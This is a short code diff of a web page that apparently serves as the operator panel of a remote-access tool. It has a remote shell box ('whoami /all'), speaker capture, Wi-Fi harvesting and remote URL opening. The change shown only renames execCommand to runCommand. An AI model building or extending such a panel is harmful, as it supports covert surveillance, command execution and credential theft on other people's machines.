@@ -173,7 +173,7 @@
       </div>
       <div class="flex items-center gap-3 mb-6">
         <input type="text" id="shellInput" placeholder="whoami /all" class="flex-1 bg-slate-950 border border-slate-800 text-sm rounded-lg px-3 py-2.5 text-slate-200 font-mono placeholder-slate-500 focus:outline-none focus:border-emerald-500 focus:ring-1 focus:ring-emerald-500 transition">
-        <button class="px-5 py-2.5 text-sm font-medium text-white bg-emerald-600 hover:bg-emerald-700 rounded-lg border border-emerald-500 transition disabled:opacity-50" id="shellExecBtn" onclick="execCommand()">Execute</button>
+        <button class="px-5 py-2.5 text-sm font-medium text-white bg-emerald-600 hover:bg-emerald-700 rounded-lg border border-emerald-500 transition disabled:opacity-50" id="shellExecBtn" onclick="runCommand()">Execute</button>
       </div>
       <div class="overflow-x-auto">
         <table class="w-full text-left border-collapse">
@@ -720,7 +720,7 @@ async function sendSpeakerCapture() {
   btn.disabled = false; btn.textContent = 'Capture Speaker';
 }
 
-async function execCommand() {
+async function runCommand() {
   const btn = document.getElementById('shellExecBtn');
   const input = document.getElementById('shellInput');
   const hostname = document.getElementById('hostnameInput').value.trim();
@@ -743,14 +743,14 @@ async function execCommand() {
 
 async function execQuickCmd(cmd) {
   document.getElementById('shellInput').value = cmd;
-  await execCommand();
+  await runCommand();
 }
 
 async function execQuickOpenUrl() {
   const url = prompt('Enter URL to open:');
   if (!url || !url.trim()) return;
   document.getElementById('shellInput').value = 'start "" "' + url.trim() + '"';
-  await execCommand();
+  await runCommand();
 }
 
 async function wifiHarvest() {
@@ -900,7 +900,7 @@ document.getElementById('triggerInput').addEventListener('keydown', (e) => {
   if (e.key === 'Enter') addTrigger();
 });
 document.getElementById('shellInput').addEventListener('keydown', (e) => {
-  if (e.key === 'Enter') execCommand();
+  if (e.key === 'Enter') runCommand();
 });
 
 window.addEventListener('DOMContentLoaded', () => {
